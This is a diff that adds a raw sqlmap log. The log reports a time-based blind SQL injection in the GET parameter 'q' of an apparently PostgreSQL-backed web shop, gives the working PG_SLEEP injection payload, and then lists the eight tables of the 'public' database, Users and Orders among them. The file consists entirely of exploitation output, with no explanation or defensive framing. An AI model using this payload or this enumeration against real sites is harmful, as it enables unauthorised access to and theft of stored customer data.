@@ -1,0 +1,30 @@
+sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: q=demo' AND 7312=(SELECT 7312 FROM PG_SLEEP(2))-- -
+---
+back-end DBMS: PostgreSQL
+current database (equivalent to schema on PostgreSQL): 'public'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: q (GET)
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: q=demo' AND 7312=(SELECT 7312 FROM PG_SLEEP(2))-- -
+---
+back-end DBMS: PostgreSQL
+Database: public
+[8 tables]
++-----------------------+
+| CartItems             |
+| Carts                 |
+| Comments              |
+| OrderItems            |
+| Orders                |
+| Products              |
+| Users                 |
+| __EFMigrationsHistory |
++-----------------------+
+
